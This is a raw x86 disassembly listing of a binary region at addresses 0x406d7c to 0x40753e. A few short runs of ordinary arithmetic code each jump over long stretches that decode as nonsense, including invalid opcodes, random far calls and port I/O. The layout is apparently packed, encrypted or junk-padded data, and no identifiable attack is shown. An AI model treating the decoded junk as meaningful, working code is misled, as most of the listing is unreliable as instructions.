  406d7c:	shrd   eax,ecx,0x2
  406d80:	shr    ecx,0x2
  406d83:	mov    ecx,DWORD PTR [ebp-0x60]
  406d86:	mov    edx,DWORD PTR [ebp-0x5c]
  406d89:	xor    eax,edi
  406d8b:	xor    edx,edx
  406d8d:	or     eax,edx
  406d8f:	mov    edx,DWORD PTR [ebp+0x14]
  406d92:	shl    ecx,0x1e
  406d95:	mov    ecx,DWORD PTR [ebp-0x14]
  406d98:	mov    cl,BYTE PTR [eax+ecx*1]
  406d9b:	mov    eax,DWORD PTR [ebp-0x34]
  406d9e:	or     BYTE PTR [eax],cl
  406da0:	mov    eax,DWORD PTR [ebp+0x10]
  406da3:	jmp    0x407181
  406da8:	fcmovnb st,st(6)
  406daa:	int3   
  406dab:	xchg   edi,eax
  406dac:	lods   al,BYTE PTR ds:[esi]
  406dad:	jnp    0x406dc9
  406daf:	sbb    cl,BYTE PTR [edi+0x3c6a0603]
  406db5:	jns    0x406dcf
  406db7:	stos   BYTE PTR es:[edi],al
  406db8:	or     cl,BYTE PTR [ebx+0x129e1818]
  406dbe:	sbb    BYTE PTR [eax],bl
  406dc0:	lock pop esi
  406dc2:	or     ch,BYTE PTR [ecx]
  406dc4:	mov    al,ds:0xba6e7cb1
  406dc9:	pop    es
  406dca:	xchg   BYTE PTR [edi+0x24856ed1],bh
  406dd0:	jo     0x406df4
  406dd2:	daa    
  406dd3:	ss xor al,0x75
  406dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dd7:	in     eax,0xa2
  406dd9:	dec    DWORD PTR [eax-0x5c87f009]
  406ddf:	mov    cl,dh
  406de1:	sub    BYTE PTR [ebp-0x67],dl
  406de4:	shl    DWORD PTR [ebp-0x6176053e],1
  406dea:	fstp   TBYTE PTR [ebx-0x65e9f26c]
  406df0:	jne    0x406e25
  406df2:	dec    ecx
  406df3:	mov    ds:0x7ba774d1,eax
  406df8:	(bad)  
  406df9:	cli    
  406dfa:	mov    esp,0xa6dcb35b
  406dff:	shl    BYTE PTR [eax],1
  406e01:	rcr    BYTE PTR [ebp+0x7f],cl
  406e04:	cld    
  406e05:	rcr    BYTE PTR [edi-0x69c96452],1
  406e0b:	jle    0x406e1f
  406e0d:	fild   DWORD PTR [esi+0x48]
  406e10:	pop    eax
  406e11:	test   al,0x30
  406e13:	adc    bh,BYTE PTR [edi+0x5960dadc]
  406e19:	cwde   
  406e1a:	lods   al,BYTE PTR ds:[esi]
  406e1b:	into   
  406e1c:	xor    cl,cl
  406e1e:	xchg   ebx,eax
  406e1f:	jp     0x406de1
  406e21:	dec    ecx
  406e22:	ins    DWORD PTR es:[edi],dx
  406e23:	dec    esi
  406e24:	sub    ebx,DWORD PTR [ebx+0x6815359c]
  406e2a:	mov    eax,0xdf9b3f33
  406e2f:	mov    esi,0x9839c95a
  406e34:	add    al,0xda
  406e36:	ja     0x406e94
  406e38:	xchg   ecx,eax
  406e39:	xlat   BYTE PTR ds:[ebx]
  406e3a:	(bad)  
  406e3b:	xchg   ecx,eax
  406e3c:	xchg   ebp,eax
  406e3d:	out    dx,eax
  406e3e:	and    al,0x16
  406e40:	mov    BYTE PTR [esi+0x59],ch
  406e43:	in     al,0x85
  406e45:	push   0x67
  406e47:	sub    dl,dh
  406e49:	dec    esp
  406e4a:	(bad)  
  406e4b:	lea    ebx,fs:[edx]
  406e4e:	mov    edx,0x2f3fd6ea
  406e53:	lods   eax,DWORD PTR ds:[esi]
  406e54:	pop    esp
  406e55:	icebp  
  406e56:	push   cs
  406e57:	add    dl,al
  406e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e5a:	sbb    ecx,edi
  406e5c:	sub    eax,0xd47bf149
  406e61:	outs   dx,DWORD PTR ds:[esi]
  406e62:	jns    0x406eb6
  406e64:	xor    eax,0x6684d1e0
  406e69:	into   
  406e6a:	mul    edx
  406e6c:	addr16 es xor al,0xfe
  406e70:	jbe    0x406e22
  406e72:	and    DWORD PTR [eax],ebx
  406e74:	mov    DWORD PTR [ebp+0x0],esp
  406e77:	mov    esp,0x39224340
  406e7c:	mov    ecx,0xf29b28ab
  406e81:	loope  0x406eab
  406e83:	mov    cl,BYTE PTR [edi+eax*4]
  406e86:	push   cs
  406e87:	shl    DWORD PTR [ecx-0x6056d356],cl
  406e8d:	push   ebx
  406e8e:	aaa    
  406e8f:	outs   dx,BYTE PTR ds:[esi]
  406e90:	jmp    0x406e27
  406e92:	and    al,0xb5
  406e94:	aad    0x46
  406e96:	xor    DWORD PTR [edi-0x43],0xe18c68c4
  406e9d:	inc    ebp
  406e9e:	push   es
  406e9f:	xchg   cl,ah
  406ea1:	imul   ebx,DWORD PTR [ebx-0x21],0xfffffffe
  406ea5:	xor    BYTE PTR [esi+0x49],ch
  406ea8:	sbb    eax,0x281b17dd
  406ead:	in     eax,0x8c
  406eaf:	jecxz  0x406e98
  406eb1:	(bad)  
  406eb4:	jne    0x406e97
  406eb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb7:	jmp    0x3907:0xa05ee24d
  406ebe:	lahf   
  406ebf:	fcom   st(6)
  406ec1:	into   
  406ec2:	sub    dl,al
  406ec4:	cs mov ah,0xa5
  406ec7:	sub    DWORD PTR [edi-0x6a08cf54],esp
  406ecd:	rcl    al,0xd1
  406ed0:	mov    edi,0xc29535b
  406ed5:	cmp    al,0xf8
  406ed7:	out    dx,eax
  406ed8:	lea    esi,[edi+edx*4]
  406edb:	test   DWORD PTR [ecx],eax
  406edd:	and    eax,0xb5dbe16e
  406ee2:	cli    
  406ee3:	fcmovnbe st,st(2)
  406ee5:	call   0x7c8ff7e5
  406eea:	retf   
  406eeb:	mov    edx,DWORD PTR [eax+0x79]
  406eee:	push   edi
  406eef:	aam    0x48
  406ef1:	loopne 0x406eb9
  406ef3:	inc    edx
  406ef4:	push   edx
  406ef5:	outs   dx,DWORD PTR ds:[esi]
  406ef6:	adc    BYTE PTR [ebx-0x3e],0x37
  406efa:	sahf   
  406efb:	sub    DWORD PTR [ebx-0x73],edx
  406efe:	mov    bh,0x25
  406f00:	cmp    esi,DWORD PTR [esi]
  406f02:	add    edx,esi
  406f04:	pop    ds
  406f05:	aad    0xa4
  406f07:	xchg   edx,eax
  406f08:	lds    ebp,FWORD PTR [eax]
  406f0a:	cmp    al,0xdf
  406f0c:	jae    0x406f09
  406f0e:	adc    edi,esp
  406f10:	test   ebx,eax
  406f12:	int3   
  406f13:	xor    al,0x64
  406f15:	pushf  
  406f16:	cmp    eax,0x730b83e5
  406f1b:	and    BYTE PTR [edx+0x488304f6],cl
  406f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f22:	imul   ebx,eax,0xffffffd5
  406f25:	or     ah,BYTE PTR [edx-0x2b]
  406f28:	push   esi
  406f29:	fmul   DWORD PTR [esi]
  406f2b:	push   ds
  406f2c:	pop    es
  406f2d:	scas   eax,DWORD PTR es:[edi]
  406f2e:	sbb    al,bh
  406f30:	or     ebp,DWORD PTR ds:0xfcb795f9
  406f36:	mov    ebx,0x9144ec00
  406f3b:	add    al,0x71
  406f3d:	jge    0x406f4b
  406f3f:	in     eax,0x50
  406f41:	jno    0x406f6e
  406f43:	xor    BYTE PTR [ebx+ebp*1+0x62936600],dh
  406f4a:	pop    ebx
  406f4b:	cli    
  406f4c:	in     al,0x28
  406f4e:	dec    ebp
  406f4f:	add    DWORD PTR [eax+0x409037b6],edi
  406f55:	int3   
  406f56:	jns    0x406f73
  406f58:	mov    ecx,0x397e9c54
  406f5d:	aaa    
  406f5e:	ins    DWORD PTR es:[edi],dx
  406f5f:	(bad)  
  406f60:	pushf  
  406f61:	mov    eax,DWORD PTR [edi+edx*1-0x73]
  406f65:	popf   
  406f66:	sbb    al,0x96
  406f68:	inc    ebx
  406f69:	xor    esi,edx
  406f6b:	fild   QWORD PTR [eax]
  406f6d:	popf   
  406f6e:	repz shr BYTE PTR [ecx-0x75d3c5e3],0x53
  406f76:	popa   
  406f77:	push   0x10c883b0
  406f7c:	push   ecx
  406f7d:	scas   al,BYTE PTR es:[edi]
  406f7e:	and    BYTE PTR [ebx+0x69],ah
  406f81:	cmp    eax,0x4a3e9650
  406f86:	and    bl,BYTE PTR [ebx-0x745ed441]
  406f8c:	dec    esi
  406f8d:	jnp    0x40700e
  406f8f:	lahf   
  406f90:	xchg   edi,eax
  406f91:	(bad)  
  406f92:	fmul   st(5),st
  406f94:	inc    esi
  406f95:	push   ds
  406f96:	shl    bl,0xe8
  406f99:	ins    BYTE PTR es:[edi],dx
  406f9a:	aas    
  406f9b:	or     al,BYTE PTR [ecx]
  406f9d:	pop    edi
  406f9e:	xchg   ebp,eax
  406f9f:	sahf   
  406fa0:	mov    cl,0x62
  406fa2:	and    BYTE PTR [esp+eax*1+0x5efb51ef],cl
  406fa9:	iret   
  406faa:	fbstp  TBYTE PTR [esi-0x7e55c9cc]
  406fb0:	jp     0x407020
  406fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fb3:	outs   dx,BYTE PTR ds:[esi]
  406fb4:	cli    
  406fb5:	mov    ds:0x109b6b3f,al
  406fba:	or     eax,0x2dd84a1c
  406fbf:	cmp    esp,DWORD PTR [ebx+0x38]
  406fc2:	loope  0x407032
  406fc4:	gs mov al,0xfa
  406fc7:	or     al,0x9f
  406fc9:	test   ch,al
  406fcb:	out    0x0,al
  406fcd:	add    al,0x63
  406fcf:	jno    0x406fdd
  406fd1:	jg     0x407006
  406fd3:	sub    dh,BYTE PTR es:0x32f44b4a
  406fda:	outs   dx,DWORD PTR ds:[esi]
  406fdb:	sbb    ecx,eax
  406fdd:	sub    eax,DWORD PTR [ebp+0x70]
  406fe0:	jge    0x406fb9
  406fe2:	push   ebx
  406fe3:	not    BYTE PTR [eax-0x5a]
  406fe6:	or     BYTE PTR [eax],bl
  406fe8:	xlat   BYTE PTR ds:[ebx]
  406fe9:	fsubr  QWORD PTR [eax-0x36]
  406fec:	repz add ecx,DWORD PTR [ebp-0x6c814815]
  406ff3:	rcl    DWORD PTR [ebx-0x29],cl
  406ff6:	push   0xa43e587c
  406ffb:	jae    0x407055
  406ffd:	mov    ch,0xe4
  406fff:	mov    eax,0xabc21578
  407004:	and    esp,ebp
  407006:	pop    es
  407007:	jo     0x407014
  407009:	fnstsw WORD PTR [edx-0x64]
  40700c:	xchg   ebx,eax
  40700d:	ins    DWORD PTR es:[edi],dx
  40700e:	pop    esp
  40700f:	push   ebp
  407010:	mul    BYTE PTR [esi]
  407012:	mov    edx,0x4d477f46
  407017:	and    al,0xe8
  407019:	cmp    al,0x65
  40701b:	jbe    0x407086
  40701d:	loop   0x40701b
  40701f:	sub    edx,DWORD PTR [edi+0x65]
  407022:	inc    ebp
  407023:	adc    dl,BYTE PTR [esi-0x30]
  407026:	cmp    al,0xec
  407028:	dec    ebp
  407029:	dec    ebx
  40702a:	scas   al,BYTE PTR es:[edi]
  40702b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40702c:	xlat   BYTE PTR ds:[ebx]
  40702d:	cmp    esi,esp
  40702f:	pop    ebx
  407030:	clc    
  407031:	mov    cs,esp
  407033:	inc    edi
  407034:	call   0x2635:0x26ae032
  40703b:	int3   
  40703c:	int    0xda
  40703e:	add    DWORD PTR [ecx-0x324cf7fa],ebp
  407044:	sbb    DWORD PTR [ebx],esp
  407046:	mov    ecx,0xbd90030e
  40704b:	aad    0xb0
  40704d:	cmp    bh,al
  40704f:	retf   0xf2f0
  407052:	in     al,0xf6
  407054:	in     al,0xb6
  407056:	mov    ds:0xe0cf9e91,al
  40705b:	push   ss
  40705c:	call   0x40a59264
  407061:	imul   edx,esp,0x672cb5ba
  407067:	cdq    
  407068:	inc    ebp
  407069:	aam    0xff
  40706b:	and    dl,BYTE PTR [ebp+edx*4-0x1]
  40706f:	inc    edi
  407070:	(bad)  
  407072:	inc    eax
  407073:	cs jg  0x4070d5
  407076:	or     bl,BYTE PTR [esi-0xaa2c525]
  40707c:	add    eax,0xe5caeb32
  407081:	icebp  
  407082:	pop    ebx
  407083:	(bad)  
  407084:	(bad)  
  407085:	push   0xffffffe4
  407087:	rol    DWORD PTR [edi-0x5e],0x4b
  40708b:	cmp    dl,al
  40708d:	pop    ebx
  40708e:	mov    ds:0xf1e88fb,al
  407093:	mov    esp,0x4e652cd3
  407098:	daa    
  407099:	pop    ebx
  40709a:	sahf   
  40709b:	sub    ebp,DWORD PTR [ebx+0x3e930433]
  4070a1:	jmp    0x1fc6:0xf28b29de
  4070a8:	xor    bl,ch
  4070aa:	sar    DWORD PTR [ecx],1
  4070ac:	ficomp DWORD PTR [edx+0x2d]
  4070af:	cdq    
  4070b0:	jnp    0x4070f2
  4070b2:	pop    esi
  4070b3:	aad    0x44
  4070b5:	ss pusha 
  4070b7:	push   ds
  4070b8:	aaa    
  4070b9:	pop    ds
  4070ba:	inc    ecx
  4070bb:	sar    BYTE PTR [ebp-0x495c817d],0x7c
  4070c2:	je     0x40712d
  4070c4:	pushf  
  4070c5:	mov    bh,bl
  4070c7:	xchg   ebp,eax
  4070c8:	mov    ecx,0x20937e34
  4070cd:	mov    ebp,0xf5d0d655
  4070d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d3:	cmp    BYTE PTR [ebx-0x61],ch
  4070d6:	(bad)  
  4070d7:	(bad)  
  4070d8:	sub    edx,DWORD PTR [ecx-0x69]
  4070db:	mov    bl,dh
  4070dd:	jno    0x4070c9
  4070df:	jg     0x40706a
  4070e1:	hlt    
  4070e2:	mov    bh,0x75
  4070e4:	rcl    BYTE PTR [ebx+0x6dcf274a],1
  4070ea:	or     eax,0xd0756dbf
  4070ef:	xchg   ebp,eax
  4070f0:	in     eax,0x9
  4070f2:	scas   al,BYTE PTR es:[edi]
  4070f3:	xchg   BYTE PTR [eax],bh
  4070f5:	mov    WORD PTR [edx+0x6b],cs
  4070f8:	nop
  4070f9:	out    dx,eax
  4070fa:	js     0x407131
  4070fc:	mov    ecx,0x1fa564af
  407101:	shr    DWORD PTR [esi+eax*1-0x5bba3966],0xd1
  407109:	dec    ecx
  40710a:	fs push 0x78
  40710d:	mov    bh,bl
  40710f:	or     BYTE PTR [ebx-0x6c27a905],dl
  407115:	imul   ebp,eax,0xffffffed
  407118:	stos   BYTE PTR es:[edi],al
  407119:	addr16 in eax,0x48
  40711c:	sahf   
  40711d:	mov    ch,0x3e
  40711f:	dec    esi
  407120:	cmp    edi,eax
  407122:	rcl    BYTE PTR [esp+eiz*2+0x1c],0x8
  407127:	sar    DWORD PTR [edi-0x28],0x95
  40712b:	leave  
  40712c:	aad    0x70
  40712e:	push   ebx
  40712f:	ds dec eax
  407131:	mov    dh,0xfc
  407133:	pop    ecx
  407134:	jge    0x4070c0
  407136:	call   0xe54a8ef7
  40713b:	xchg   DWORD PTR [ecx+0x2fc61133],edx
  407141:	dec    ebx
  407142:	fcomp  DWORD PTR [esp+esi*4+0x5d1ac4b2]
  407149:	pop    ecx
  40714a:	outs   dx,BYTE PTR ds:[esi]
  40714b:	(bad)  
  40714c:	test   eax,0xa472d422
  407151:	dec    ebp
  407152:	pop    edx
  407153:	std    
  407154:	loope  0x40710a
  407156:	into   
  407157:	fisub  WORD PTR [edx+edx*4]
  40715a:	jns    0x407189
  40715c:	lods   eax,DWORD PTR ds:[esi]
  40715d:	add    eax,0x5dcba2c1
  407162:	or     ebx,DWORD PTR [edi]
  407164:	adc    edx,edx
  407166:	ret    0x23d9
  407169:	sti    
  40716a:	push   ss
  40716b:	int    0xa8
  40716d:	mov    eax,ds:0x3f6a7f1a
  407172:	cmp    BYTE PTR [ecx-0x63],bl
  407175:	stc    
  407176:	bound  ebp,QWORD PTR ss:[edi]
  407179:	adc    DWORD PTR ss:[edi+0x3d],0x73bc8a39
  407181:	mov    ecx,eax
  407183:	shrd   ecx,edx,0x2
  407187:	shl    eax,0x1e
  40718a:	shr    edx,0x2
  40718d:	mov    DWORD PTR [ebp+0x14],edx
  407190:	mov    DWORD PTR [ebp+0x14],eax
  407193:	xor    edx,edx
  407195:	mov    eax,ecx
  407197:	xor    eax,edi
  407199:	or     eax,edx
  40719b:	mov    edx,DWORD PTR [ebp-0x4]
  40719e:	dec    eax
  40719f:	not    eax
  4071a1:	and    eax,edx
  4071a3:	xor    ecx,edi
  4071a5:	mov    DWORD PTR [ebp-0x4],eax
  4071a8:	mov    DWORD PTR [ebp+0x14],ecx
  4071ab:	xor    eax,eax
  4071ad:	or     DWORD PTR [ebp+0x14],eax
  4071b0:	mov    eax,DWORD PTR [ebp-0x50]
  4071b3:	jmp    0x407591
  4071b8:	fiadd  DWORD PTR [ecx-0x1d]
  4071bb:	mov    ah,BYTE PTR [edx]
  4071bd:	sub    bl,BYTE PTR [edx+0x21]
  4071c0:	jnp    0x407190
  4071c2:	mov    ch,0x7c
  4071c4:	cmp    ch,BYTE PTR [ebx-0x55]
  4071c7:	mov    al,0x90
  4071c9:	test   DWORD PTR [eax],ebx
  4071cb:	sbb    BYTE PTR [esi-0x7e7e7ee],bl
  4071d1:	xchg   esi,eax
  4071d2:	bound  esi,QWORD PTR [ecx]
  4071d4:	popf   
  4071d5:	call   0xc9459a1f
  4071da:	stc    
  4071db:	cmp    ax,0xe729
  4071df:	jbe    0x40716d
  4071e1:	mov    al,0x86
  4071e3:	stos   DWORD PTR es:[edi],eax
  4071e4:	in     eax,0xad
  4071e6:	mov    ah,0xfb
  4071e8:	push   ds
  4071e9:	mov    al,0xf7
  4071eb:	out    0x75,eax
  4071ed:	dec    ecx
  4071ee:	test   eax,0x2743a2b8
  4071f3:	in     eax,dx
  4071f4:	shl    BYTE PTR es:[edx-0xef7e844],1
  4071fb:	out    dx,al
  4071fc:	data16 jb 0x407260
  4071ff:	test   edi,0xecb1aa9b
  407205:	mov    eax,ds:0x35a04b05
  40720a:	cmp    ebx,ebp
  40720c:	(bad)  
  40720d:	adc    dl,dl
  40720f:	xor    BYTE PTR [ebx+edx*4],bh
  407212:	in     al,dx
  407213:	push   esi
  407214:	(bad)  
  407215:	not    DWORD PTR [edi+0x75]
  407218:	psubsw mm3,mm5
  40721b:	jle    0x407202
  40721d:	aas    
  40721e:	jnp    0x4071e6
  407220:	aad    0x84
  407222:	and    ch,BYTE PTR [edx+0x75f43eb]
  407228:	sbb    al,0x3b
  40722a:	mov    ds,WORD PTR [edx+eiz*8-0x37eb3d0b]
  407231:	xor    al,0x11
  407233:	test   BYTE PTR [ebp-0x296febba],bh
  407239:	in     al,dx
  40723a:	ins    BYTE PTR es:[edi],dx
  40723b:	loopne 0x40728c
  40723d:	fild   DWORD PTR [esi-0x4088f499]
  407243:	mov    ?,WORD PTR [esi+0x11]
  407246:	mov    al,0xd8
  407248:	test   DWORD PTR [edx],0x708eb5a6
  40724e:	push   eax
  40724f:	int    0x8a
  407251:	and    ah,BYTE PTR [ebp*1+0x1f7e1747]
  407258:	nop
  407259:	cmp    al,0xff
  40725b:	push   ebp
  40725c:	pop    ebp
  40725d:	sar    ch,1
  40725f:	mov    eax,0xf690974d
  407264:	xchg   edx,eax
  407265:	xchg   ecx,eax
  407266:	cmp    al,0x16
  407268:	loop   0x40724f
  40726a:	lods   eax,DWORD PTR ds:[esi]
  40726b:	jl     0x40728d
  40726d:	pop    ebp
  40726e:	aaa    
  40726f:	adc    al,0x4b
  407271:	fsubr  DWORD PTR [edx]
  407273:	adc    al,0xae
  407275:	adc    bh,BYTE PTR [ecx]
  407277:	shl    DWORD PTR [ecx+0x1ae7b50b],0xc2
  40727e:	aad    0xf4
  407280:	dec    esp
  407281:	xor    eax,0x41fbbd50
  407286:	call   DWORD PTR [esi+0x4]
  407289:	hlt    
  40728a:	pop    edx
  40728b:	sbb    ah,dl
  40728d:	rcr    BYTE PTR [esi],0xb8
  407290:	mov    ecx,0x43a53bda
  407295:	or     BYTE PTR [eax],ah
  407297:	nop
  407298:	outs   dx,BYTE PTR ds:[esi]
  407299:	xor    al,0x3d
  40729b:	mov    eax,?
  40729d:	adc    ah,BYTE PTR [eax]
  40729f:	mov    ch,0xc3
  4072a1:	push   cs
  4072a2:	je     0x4072a1
  4072a4:	and    ah,cl
  4072a6:	and    bh,BYTE PTR [ecx+0x64]
  4072a9:	push   0x94c55d21
  4072ae:	and    al,0x70
  4072b0:	mov    ds:0x8f3d158a,eax
  4072b5:	(bad)  
  4072b6:	and    eax,0x6cb7aac
  4072bb:	xchg   ebp,eax
  4072bc:	arpl   WORD PTR ds:[ecx+0x2c],di
  4072c0:	stos   BYTE PTR es:[edi],al
  4072c1:	add    DWORD PTR [ebx],edx
  4072c3:	stos   DWORD PTR es:[edi],eax
  4072c4:	ds pop esi
  4072c6:	fnstenv [ebx*1+0x1d6212c8]
  4072cd:	mov    dl,0xfc
  4072cf:	jnp    0x407319
  4072d1:	adc    edi,DWORD PTR [edx+0x73]
  4072d4:	fwait
  4072d5:	inc    esp
  4072d6:	xchg   ebp,eax
  4072d7:	push   es
  4072d8:	lods   eax,DWORD PTR ds:[esi]
  4072d9:	icebp  
  4072da:	fninit 
  4072dc:	mov    edx,0xffdb8fc0
  4072e1:	mov    al,ds:0xea27f715
  4072e6:	mov    ch,0x26
  4072e8:	push   ss
  4072e9:	arpl   WORD PTR [eax],bp
  4072eb:	fist   WORD PTR [ecx-0x65ad13da]
  4072f1:	rol    DWORD PTR [ecx],1
  4072f3:	jae    0x407342
  4072f5:	jl     0x40731d
  4072f7:	cmp    eax,0x58d78d54
  4072fc:	loope  0x40735b
  4072fe:	add    eax,0xc04f8a8e
  407303:	and    dl,BYTE PTR ds:0xadc0c1cd
  407309:	cmp    al,0xd0
  40730b:	call   FWORD PTR [edi+0x77]
  40730e:	add    cl,BYTE PTR [edx+ebx*4]
  407311:	jmp    0x407342
  407313:	mov    ds:0xd43bf8a7,al
  407318:	xchg   esp,eax
  407319:	dec    esi
  40731a:	btr    DWORD PTR ds:0xc84a2d73,esi
  407321:	jns    0x40731e
  407323:	ins    DWORD PTR es:[edi],dx
  407324:	sbb    DWORD PTR [edi+0x5c304913],0xfffffffb
  40732b:	mov    DWORD PTR [esi+eiz*2+0x1e],eax
  40732f:	retf   0xb95
  407332:	inc    esi
  407333:	in     al,dx
  407334:	mov    ebx,0x930f9ca2
  407339:	dec    edi
  40733a:	xchg   esi,eax
  40733b:	push   ecx
  40733c:	push   esp
  40733d:	dec    eax
  40733e:	xchg   edx,eax
  40733f:	xchg   edi,eax
  407340:	jb     0x4072c8
  407342:	mov    esi,ebp
  407344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407345:	pop    eax
  407346:	inc    ebp
  407347:	adc    ah,BYTE PTR ds:[ebp+0x6344594e]
  40734e:	cwde   
  40734f:	cmp    eax,0xa1b25de
  407354:	cli    
  407355:	pop    edx
  407356:	loope  0x40731d
  407358:	in     al,dx
  407359:	loop   0x407367
  40735b:	mul    BYTE PTR [edi]
  40735d:	pop    esi
  40735e:	push   0x9bc86c66
  407363:	call   0xe897b4e9
  407368:	out    0x2b,al
  40736a:	xchg   ebx,eax
  40736b:	mov    ebp,0x10553ed1
  407370:	(bad)  
  407371:	and    DWORD PTR [ecx],esi
  407373:	imul   esi,ecx,0x2c342539
  407379:	push   eax
  40737a:	inc    ebp
  40737b:	add    ebx,DWORD PTR [edx-0x6b]
  40737e:	ret    0x7a6b
  407381:	mov    DWORD PTR [esp+eax*2-0x7083f2dd],ebp
  407388:	xchg   esp,eax
  407389:	ins    BYTE PTR es:[edi],dx
  40738a:	mov    DWORD PTR [eax-0x24],ebp
  40738d:	jp     0x407344
  40738f:	xchg   DWORD PTR [edx],edi
  407391:	ja     0x40736c
  407393:	ins    BYTE PTR es:[edi],dx
  407394:	call   FWORD PTR [ecx+0x1eb9f9db]
  40739a:	mov    ecx,0xed39679c
  40739f:	popa   
  4073a0:	push   ebp
  4073a1:	xor    BYTE PTR [esi-0x3f],bh
  4073a4:	test   BYTE PTR [edi-0x2b],0x7b
  4073a8:	not    bl
  4073aa:	aam    0xc2
  4073ac:	adc    eax,0xf990a57f
  4073b1:	push   esi
  4073b2:	adc    ch,BYTE PTR [edx]
  4073b4:	mov    ecx,esp
  4073b6:	aaa    
  4073b7:	int    0x98
  4073b9:	test   DWORD PTR [eax],ebx
  4073bb:	pop    eax
  4073bc:	inc    ebx
  4073bd:	jne    0x407380
  4073bf:	jae    0x4073ba
  4073c1:	and    al,0x51
  4073c3:	jne    0x4073b2
  4073c5:	imul   esp,DWORD PTR [edi+ebx*8-0x67],0x63
  4073ca:	lods   al,BYTE PTR ds:[esi]
  4073cb:	inc    ebp
  4073cc:	call   0xb130:0x35a63a25
  4073d3:	push   cs
  4073d4:	jg     0x40740f
  4073d6:	mov    ecx,0xce306e63
  4073db:	test   al,0xc2
  4073dd:	std    
  4073de:	dec    ecx
  4073df:	adc    bh,BYTE PTR [esi-0x38]
  4073e2:	push   0xcbb1fb06
  4073e7:	xor    ebp,ecx
  4073e9:	mov    eax,0x94f2147d
  4073ee:	ror    BYTE PTR [ebp-0x59],1
  4073f1:	push   0x5fda9551
  4073f6:	sbb    dh,bh
  4073f8:	mov    ah,0xa3
  4073fa:	leave  
  4073fb:	ja     0x407419
  4073fd:	dec    ecx
  4073fe:	(bad)  
  4073ff:	int    0x6c
  407401:	cmc    
  407402:	add    al,0x5a
  407404:	jp     0x40740d
  407406:	xchg   esp,eax
  407407:	adc    eax,0x4a2b66b7
  40740c:	push   0xd829699d
  407411:	mov    fs,WORD PTR [ebx]
  407413:	and    eax,0xe4ad6d4d
  407418:	pop    ebp
  407419:	or     al,0x1f
  40741b:	lock stos DWORD PTR es:[edi],eax
  40741d:	xchg   ebx,esi
  40741f:	xchg   esp,eax
  407420:	mov    dl,0x8e
  407422:	(bad)  
  407424:	cmc    
  407425:	mov    ecx,0xf440144f
  40742a:	int    0xe3
  40742c:	adc    DWORD PTR [eax+ebp*4-0x52cf9826],edi
  407433:	mov    ebp,0xd9d2f3a8
  407438:	int3   
  407439:	popa   
  40743a:	pop    ebp
  40743b:	jb     0x407452
  40743d:	outs   dx,DWORD PTR ds:[esi]
  40743e:	push   cs
  40743f:	popa   
  407440:	dec    esi
  407441:	or     al,cl
  407443:	or     DWORD PTR [edx-0xc],eax
  407446:	sub    BYTE PTR [edi],cl
  407448:	in     al,0xa6
  40744a:	(bad)
  40744e:	inc    esi
  40744f:	neg    BYTE PTR [edx+0x3c715a79]
  407455:	out    dx,eax
  407456:	enter  0x6747,0x57
  40745a:	fidiv  WORD PTR [ebp*4+0x47c6b0ec]
  407461:	fs adc dl,bl
  407464:	(bad)  
  407465:	pop    esi
  407466:	aas    
  407467:	gs push ds
  407469:	sbb    al,0x5
  40746b:	xchg   esi,eax
  40746c:	mov    dh,0x85
  40746e:	inc    edi
  40746f:	sahf   
  407470:	sub    ecx,esi
  407472:	or     DWORD PTR [eax+0x2e],ecx
  407475:	mov    esp,0x9978b467
  40747a:	push   0x0
  40747c:	pop    esi
  40747d:	xchg   edi,eax
  40747e:	xor    esi,ebp
  407480:	repnz into 
  407482:	cmp    dl,BYTE PTR [eax]
  407484:	loop   0x407481
  407486:	popf   
  407487:	loop   0x407489
  407489:	fisubr WORD PTR [ebx+0x2d1ce024]
  40748f:	lock jp 0x4074e1
  407492:	cmp    eax,0xdb70533
  407497:	int    0x6f
  407499:	ficomp DWORD PTR [ecx+0x7f]
  40749c:	adc    al,0x10
  40749e:	add    BYTE PTR [edi+0x38962f25],cl
  4074a4:	xor    al,0xc6
  4074a6:	mov    DWORD PTR [ecx],edi
  4074a8:	cld    
  4074a9:	add    ch,dh
  4074ab:	fisttp DWORD PTR [esi+0x1c]
  4074ae:	or     DWORD PTR [edi+0x1a92a286],esi
  4074b4:	fs sbb edx,ebp
  4074b7:	inc    eax
  4074b8:	push   cs
  4074b9:	pop    edi
  4074ba:	cmp    al,0x32
  4074bc:	mov    esi,0x708adbba
  4074c1:	stc    
  4074c2:	int3   
  4074c3:	test   al,cl
  4074c5:	clc    
  4074c6:	imul   ebp,DWORD PTR [ebp-0x64],0xffffff91
  4074ca:	fcom   QWORD PTR [edi+0x58]
  4074cd:	fcomp  QWORD PTR [esi]
  4074cf:	pop    ebx
  4074d0:	das    
  4074d1:	dec    edi
  4074d2:	(bad)  
  4074d3:	in     eax,0xb1
  4074d5:	xor    al,0xfc
  4074d7:	xchg   esi,eax
  4074d8:	dec    ebp
  4074d9:	xor    BYTE PTR [esi],ah
  4074db:	sub    al,0xa8
  4074dd:	jo     0x4074f0
  4074df:	es stc 
  4074e1:	mov    bl,0x38
  4074e3:	out    dx,al
  4074e4:	or     ah,BYTE PTR [ebx]
  4074e6:	lock mov edi,0xc4ba2cf
  4074ec:	and    BYTE PTR ds:0xa16bca15,ch
  4074f2:	out    0xa6,eax
  4074f4:	retf   0xa098
  4074f7:	sbb    eax,0xa60da5c4
  4074fc:	rol    BYTE PTR ds:0xd80d7e61,1
  407502:	or     eax,0xc5c6faa1
  407507:	mov    bl,0x51
  407509:	xchg   ecx,eax
  40750a:	fdiv   QWORD PTR gs:[eax+eiz*1+0x5dc6660d]
  407512:	xchg   ebp,eax
  407513:	mov    edi,DWORD PTR [ecx+ebp*8-0x7be2ad87]
  40751a:	daa    
  40751b:	stos   BYTE PTR es:[edi],al
  40751c:	xor    al,BYTE PTR [ebx-0x70]
  40751f:	mov    esi,0x798cfc5a
  407524:	jb     0x40757e
  407526:	pop    ebx
  407527:	aam    0x69
  407529:	or     al,0x25
  40752b:	into   
  40752c:	fst    QWORD PTR [eax-0x72314bac]
  407532:	push   es
  407533:	imul   ebp,DWORD PTR [ebp+0xbe34211],0x1eab2372
  40753d:	ret    
  40753e:	loope  0x40755b
